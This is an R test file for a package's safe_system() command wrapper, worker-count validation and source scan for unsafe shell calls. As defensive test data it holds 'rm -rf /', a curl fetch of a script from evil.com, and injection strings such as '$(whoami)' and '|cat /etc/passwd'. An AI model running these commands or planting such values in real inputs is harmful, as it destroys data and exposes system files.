test_that("safe_system validates command whitelist", {
  # Commands not in whitelist should fail
  expect_error(
    safe_system("rm", c("-rf", "/")),
    "Command not in whitelist: rm"
  )

  expect_error(
    safe_system("curl", c("https://evil.com/script.sh")),
    "Command not in whitelist: curl"
  )

  # Allowed commands should work (if installed)
  skip_if_not(Sys.which("docker") != "", "Docker not installed")
  expect_no_error(
    safe_system("docker", c("--version"))
  )
})

test_that("safe_system prevents command injection in arguments", {
  skip_if_not(Sys.which("docker") != "", "Docker not installed")
  skip_if_not(
    tryCatch({ processx::run("docker", "info", error_on_status = FALSE)$status == 0 },
             error = function(e) FALSE),
    "Docker daemon not running"
  )

  # Malicious arguments with shell metacharacters should be safely escaped
  # This should NOT execute the injected command
  malicious_arg <- "test; echo 'INJECTED' > /tmp/starburst-injection-test"

  # safe_system should treat this as a literal argument, not execute the injection
  # Docker will fail on the malformed tag, but the injection won't run
  expect_error(
    safe_system("docker", c("build", "-t", malicious_arg, ".")),
    "failed"  # Docker will fail, not the injection executing
  )

  # Verify injection didn't run
  expect_false(file.exists("/tmp/starburst-injection-test"))

  # Try other shell metacharacters
  malicious_args <- c(
    "tag`rm -rf /tmp/test`",
    "tag$(whoami)",
    "tag&&echo hack",
    "tag||echo hack",
    "tag|cat /etc/passwd"
  )

  for (arg in malicious_args) {
    # All should fail safely (docker error, not shell execution)
    expect_error(
      safe_system("docker", c("images", arg)),
      # processx will fail because these aren't valid arguments
      # but won't execute shell commands
      NA  # Just expect an error, don't care about message
    )
  }
})

test_that("worker count validation enforced", {
  # Negative workers
  expect_error(
    validate_workers(-5),
    "positive number"
  )

  # Zero workers
  expect_error(
    validate_workers(0),
    "positive number"
  )

  # Too many workers
  expect_error(
    validate_workers(1000),
    "Workers must be <= 500"
  )

  expect_error(
    validate_workers(10000),
    "Workers must be <= 500"
  )

  # Valid worker counts should pass
  expect_silent(validate_workers(1))
  expect_silent(validate_workers(50))
  expect_silent(validate_workers(100))
  expect_silent(validate_workers(500))  # Exactly at limit
})

test_that("safe_system handles stdin securely", {
  skip("stdin test requires specific system configuration")

  # Note: The actual security of stdin handling is verified by:
  # 1. processx using proper escaping and no shell expansion
  # 2. Docker login tests which pass password via stdin
  # 3. Command injection tests which verify arguments are escaped

  # This test would verify stdin behavior but requires platform-specific
  # command availability that may not be present in all test environments
})

test_that("plan() respects worker limits", {
  skip_on_cran()
  skip_if_offline()

  # This should fail due to worker validation
  expect_error(
    plan(starburst, workers = 1000),
    "Workers must be <= 500"
  )

  # Valid plan should work (validation passes, might fail on other things)
  # We're just testing validation here
  expect_error(
    suppressMessages(validate_workers(100)),
    NA  # No error expected
  )
})

test_that("Docker commands use safe_system not shell commands", {
  # Scan all package R source files for unsafe shell patterns. Docker calls
  # live in R/images.R; other AWS helpers are spread across several files, so
  # we check the whole R/ directory rather than a single hard-coded file.
  #
  # Candidate locations, in order: the dev source tree (devtools::test()),
  # the R CMD check unpacked source, and the installed package. The installed
  # package's R/ holds only compiled .rdb/.rdx (no .R source), so we accept a
  # directory only if it actually contains .R files.
  candidate_dirs <- c(
    "../../R",                       # From tests/testthat during devtools::test()
    "../00_pkg_src/starburst/R",     # From R CMD check temp directory
    system.file("R", package = "starburst")
  )

  r_files <- character(0)
  for (dir in candidate_dirs) {
    if (nzchar(dir) && dir.exists(dir)) {
      found <- list.files(dir, pattern = "[.]R$", full.names = TRUE)
      if (length(found) > 0) {
        r_files <- found
        break
      }
    }
  }

  # Skip if no R source is available (e.g. installed-package check, where the
  # source has been compiled away and only .rdb/.rdx remain).
  if (length(r_files) == 0) {
    skip("Cannot locate package R source files")
  }

  r_content <- unlist(lapply(r_files, readLines, warn = FALSE))

  # Should NOT contain:
  # - system() with sprintf() building commands
  # - Shell redirection operators in Docker commands
  # - Unquoted variable interpolation in shell commands

  # Look for dangerous patterns
  dangerous_patterns <- c(
    'system\\(sprintf\\(',  # system(sprintf(...)) is dangerous
    'system\\("docker.*<',  # Shell redirection
    'system\\("docker.*\\|\\|',  # Shell OR
    'system\\("docker.*&&'  # Shell AND
  )

  for (pattern in dangerous_patterns) {
    matches <- grep(pattern, r_content, value = TRUE)
    expect_equal(
      length(matches),
      0,
      info = sprintf("Found unsafe pattern '%s' in package R source:\n%s",
                    pattern, paste(matches, collapse = "\n"))
    )
  }

  # Should contain safe_system calls for Docker
  expect_true(
    any(grepl('safe_system\\("docker"', r_content)),
    info = "Package R source should use safe_system() for Docker commands"
  )
})
